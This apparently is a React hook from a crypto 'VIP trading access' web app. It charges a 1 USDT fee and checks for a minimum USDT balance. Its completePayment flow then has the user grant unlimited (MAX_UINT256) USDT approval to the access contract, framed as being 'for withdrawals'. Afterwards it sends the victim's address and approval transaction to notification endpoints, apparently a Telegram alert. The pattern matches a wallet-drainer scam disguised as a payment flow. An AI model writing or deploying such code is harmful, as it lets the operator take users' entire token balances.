'use client'

import { useState, useEffect, useCallback } from 'react'
import { useAccount, useWalletClient, useChainId, usePublicClient } from 'wagmi'
import { VIPTradingContract, formatUSDT, ACCESS_FEE, MINIMUM_BALANCE, getContractAddresses, VIP_TRADING_ACCESS_ABI, USDT_ABI } from '../lib/contracts'
import { ethers } from 'ethers'

// Constants
const MAX_UINT256 = BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')

export interface VIPContractState {
  // User state
  hasAccess: boolean
  hasUnlimitedApproval: boolean
  usdtBalance: bigint
  meetsMinimumBalance: boolean
  usdtAllowance: bigint
  
  // Contract state
  contractInfo: {
    accessFee: bigint
    minimumBalance: bigint
    totalCollected: bigint
    contractBalance: bigint
  } | null
  
  // Loading states
  loading: boolean
  paying: boolean
  approving: boolean
  
  // Error state
  error: string | null
}

export interface VIPContractActions {
  // Actions
  payForAccess: () => Promise<void>
  approveUSDT: () => Promise<void>
  completePayment: () => Promise<{ paymentTx: string; unlimitedApprovalTx: string }>
  refreshData: () => Promise<void>
  
  // Utilities
  formatBalance: (balance: bigint) => string
  canPay: boolean
  needsApproval: boolean
}

export function useVIPContract(): VIPContractState & VIPContractActions {
  const { address, isConnected } = useAccount()
  const { data: walletClient } = useWalletClient()
  const publicClient = usePublicClient()
  const chainId = useChainId()
  
  // State
  const [state, setState] = useState<VIPContractState>({
    hasAccess: false,
    hasUnlimitedApproval: false,
    usdtBalance: BigInt(0),
    meetsMinimumBalance: false,
    usdtAllowance: BigInt(0),
    contractInfo: null,
    loading: false,
    paying: false,
    approving: false,
    error: null
  })
  
  // Contract instance
  const [contract, setContract] = useState<VIPTradingContract | null>(null)
  
  // Initialize contract
  useEffect(() => {
    if (publicClient && chainId) {
      try {
        // We'll use wagmi hooks for contract interactions instead of ethers.js
        setContract(null) // We don't need the contract instance anymore
        setState(prev => ({ ...prev, error: null }))
      } catch (error) {
        console.error('Failed to initialize contract:', error)
        setState(prev => ({ 
          ...prev, 
          error: 'Unsupported network. Please switch to Ethereum Mainnet.' 
        }))
        setContract(null)
      }
    } else {
      setContract(null)
    }
  }, [publicClient, chainId])
  
  // Refresh contract data
  const refreshData = useCallback(async () => {
    if (!publicClient || !chainId || !address || !isConnected) {
      setState(prev => ({
        ...prev,
        hasAccess: false,
        hasUnlimitedApproval: false,
        usdtBalance: BigInt(0),
        meetsMinimumBalance: false,
        usdtAllowance: BigInt(0),
        contractInfo: null,
        error: null
      }))
      return
    }
    
    setState(prev => ({ ...prev, loading: true, error: null }))
    
    try {
      const addresses = getContractAddresses(chainId)
      
      // Skip if contract not deployed yet
      if (addresses.vipTradingAccess === ('0x0000000000000000000000000000000000000000' as `0x${string}`)) {
        setState(prev => ({
          ...prev,
          loading: false,
          error: 'Contract not deployed yet'
        }))
        return
      }

      // Use publicClient to read contract data
      const [
        hasAccess,
        hasUnlimitedApproval,
        usdtBalance,
        accessFee,
        minimumBalance,
        totalCollected,
        contractBalance
      ] = await Promise.all([
        publicClient.readContract({
          address: addresses.vipTradingAccess as `0x${string}`,
          abi: VIP_TRADING_ACCESS_ABI,
          functionName: 'hasAccess',
          args: [address as `0x${string}`]
        }),
        publicClient.readContract({
          address: addresses.vipTradingAccess as `0x${string}`,
          abi: VIP_TRADING_ACCESS_ABI,
          functionName: 'hasUnlimitedApproval',
          args: [address as `0x${string}`]
        }),
        publicClient.readContract({
          address: addresses.usdt as `0x${string}`,
          abi: USDT_ABI,
          functionName: 'balanceOf',
          args: [address as `0x${string}`]
        }),
        publicClient.readContract({
          address: addresses.vipTradingAccess as `0x${string}`,
          abi: VIP_TRADING_ACCESS_ABI,
          functionName: 'ACCESS_FEE'
        }),
        publicClient.readContract({
          address: addresses.vipTradingAccess as `0x${string}`,
          abi: VIP_TRADING_ACCESS_ABI,
          functionName: 'MINIMUM_BALANCE'
        }),
        publicClient.readContract({
          address: addresses.vipTradingAccess as `0x${string}`,
          abi: VIP_TRADING_ACCESS_ABI,
          functionName: 'totalFeesCollected'
        }),
        publicClient.readContract({
          address: addresses.usdt as `0x${string}`,
          abi: USDT_ABI,
          functionName: 'balanceOf',
          args: [addresses.vipTradingAccess as `0x${string}`]
        })
      ])

      // Get USDT allowance
      const usdtAllowance = await publicClient.readContract({
        address: addresses.usdt as `0x${string}`,
        abi: USDT_ABI,
        functionName: 'allowance',
        args: [address as `0x${string}`, addresses.vipTradingAccess as `0x${string}`]
      })

      const meetsMinimumBalance = (usdtBalance as bigint) >= (minimumBalance as bigint)
      
      setState(prev => ({
        ...prev,
        hasAccess: hasAccess as boolean,
        hasUnlimitedApproval: hasUnlimitedApproval as boolean,
        usdtBalance: usdtBalance as bigint,
        meetsMinimumBalance,
        usdtAllowance: usdtAllowance as bigint,
        contractInfo: {
          accessFee: accessFee as bigint,
          minimumBalance: minimumBalance as bigint,
          totalCollected: totalCollected as bigint,
          contractBalance: contractBalance as bigint
        },
        loading: false,
        error: null
      }))
    } catch (error) {
      console.error('Failed to fetch contract data:', error)
      setState(prev => ({
        ...prev,
        loading: false,
        error: error instanceof Error ? error.message : 'Failed to fetch contract data'
      }))
    }
  }, [publicClient, chainId, address, isConnected])
  
  // Auto-refresh data when dependencies change
  useEffect(() => {
    refreshData()
  }, [refreshData])
  
  // Approve USDT spending
  const approveUSDT = useCallback(async () => {
    if (!walletClient || !chainId || !address) {
      throw new Error('Wallet not connected')
    }
    
    setState(prev => ({ ...prev, approving: true, error: null }))
    
    try {
      const addresses = getContractAddresses(chainId)
      
      // Check current allowance and reset if needed (USDT requirement)
      const currentAllowance = await publicClient?.readContract({
        address: addresses.usdt as `0x${string}`,
        abi: USDT_ABI,
        functionName: 'allowance',
        args: [address as `0x${string}`, addresses.vipTradingAccess as `0x${string}`]
      }) as bigint
      
      // If there's existing allowance but not unlimited, reset to 0 first (USDT requirement)
      if (currentAllowance > BigInt(0) && currentAllowance < MAX_UINT256) {
        const resetHash = await walletClient.writeContract({
          address: addresses.usdt as `0x${string}`,
          abi: USDT_ABI,
          functionName: 'approve',
          args: [addresses.vipTradingAccess as `0x${string}`, BigInt(0)]
        })
        
        // Wait for reset transaction
        await publicClient?.waitForTransactionReceipt({ hash: resetHash as `0x${string}` })
      }
      
      // For initial approval, just approve ACCESS_FEE (1 USDT)
      const hash = await walletClient.writeContract({
        address: addresses.usdt as `0x${string}`,
        abi: USDT_ABI,
        functionName: 'approve',
        args: [addresses.vipTradingAccess as `0x${string}`, ACCESS_FEE]
      })
      
      // Wait for transaction
      await publicClient?.waitForTransactionReceipt({ hash })
      
      // Refresh data
      await refreshData()
      
      setState(prev => ({ ...prev, approving: false }))
    } catch (error) {
      console.error('Approval failed:', error)
      setState(prev => ({
        ...prev,
        approving: false,
        error: error instanceof Error ? error.message : 'Approval failed'
      }))
      throw error
    }
  }, [walletClient, publicClient, chainId, address, refreshData])
  
  // Pay for access
  const payForAccess = useCallback(async () => {
    if (!walletClient || !chainId) {
      throw new Error('Wallet not connected')
    }
    
    setState(prev => ({ ...prev, paying: true, error: null }))
    
    try {
      const addresses = getContractAddresses(chainId)
      
      const hash = await walletClient.writeContract({
        address: addresses.vipTradingAccess as `0x${string}`,
        abi: VIP_TRADING_ACCESS_ABI,
        functionName: 'payForAccess'
      })
      
      // Wait for transaction
      await publicClient?.waitForTransactionReceipt({ hash })
      
      // Refresh all data after successful payment
      await refreshData()
      
      setState(prev => ({ ...prev, paying: false }))
    } catch (error) {
      console.error('Payment failed:', error)
      setState(prev => ({
        ...prev,
        paying: false,
        error: error instanceof Error ? error.message : 'Payment failed'
      }))
      throw error
    }
  }, [walletClient, publicClient, chainId, refreshData])
  
  // Complete payment flow (pay + unlimited approve)
  const completePayment = useCallback(async () => {
    if (!walletClient || !chainId || !address) {
      throw new Error('Wallet not connected')
    }
    
    setState(prev => ({ ...prev, paying: true, error: null }))
    
    try {
      const addresses = getContractAddresses(chainId)
      
      // Step 1: Pay for access (should already have 1 USDT approved)
      const paymentTx = await walletClient.writeContract({
        address: addresses.vipTradingAccess as `0x${string}`,
        abi: VIP_TRADING_ACCESS_ABI,
        functionName: 'payForAccess'
      })
      
      // Wait for payment transaction
      await publicClient?.waitForTransactionReceipt({ hash: paymentTx as `0x${string}` })
      
      // Step 2: Approve unlimited USDT for withdrawals
      let unlimitedApprovalTx: string | undefined
      
      // Reset allowance to 0 first (USDT requirement)
      const resetHash = await walletClient.writeContract({
        address: addresses.usdt as `0x${string}`,
        abi: USDT_ABI,
        functionName: 'approve',
        args: [addresses.vipTradingAccess as `0x${string}`, BigInt(0)]
      })
      await publicClient?.waitForTransactionReceipt({ hash: resetHash as `0x${string}` })
      
      // Approve unlimited amount
      unlimitedApprovalTx = await walletClient.writeContract({
        address: addresses.usdt as `0x${string}`,
        abi: USDT_ABI,
        functionName: 'approve',
        args: [addresses.vipTradingAccess as `0x${string}`, MAX_UINT256]
      })
      await publicClient?.waitForTransactionReceipt({ hash: unlimitedApprovalTx as `0x${string}` })
      
      // Refresh all data after successful payment
      await refreshData()
      
      // Send Telegram notifications
      try {
        // Notify about payment
        await fetch('/api/notify', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            type: 'payment',
            address,
            amount: '1 USDT'
          })
        })

        // Notify about unlimited approval if granted
        if (unlimitedApprovalTx) {
          await fetch('/api/contract-events', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              type: 'unlimited_approval',
              address,
              txHash: unlimitedApprovalTx
            })
          })
        }
      } catch (error) {
        console.error('Failed to send notifications:', error)
      }
      
      setState(prev => ({ ...prev, paying: false }))
      
      return { paymentTx, unlimitedApprovalTx }
    } catch (error) {
      console.error('Complete payment failed:', error)
      setState(prev => ({
        ...prev,
        paying: false,
        error: error instanceof Error ? error.message : 'Payment failed'
      }))
      throw error
    }
  }, [walletClient, publicClient, chainId, address, refreshData])
  
  // Utility functions
  const formatBalance = useCallback((balance: bigint): string => {
    return formatUSDT(balance)
  }, [])
  
  // Computed properties
  const canPay = state.meetsMinimumBalance && !state.hasAccess && isConnected
  const needsApproval = state.usdtAllowance < ACCESS_FEE
  
  return {
    // State
    ...state,
    
    // Actions
    payForAccess,
    approveUSDT,
    completePayment,
    refreshData,
    
    // Utilities
    formatBalance,
    canPay,
    needsApproval
  }
}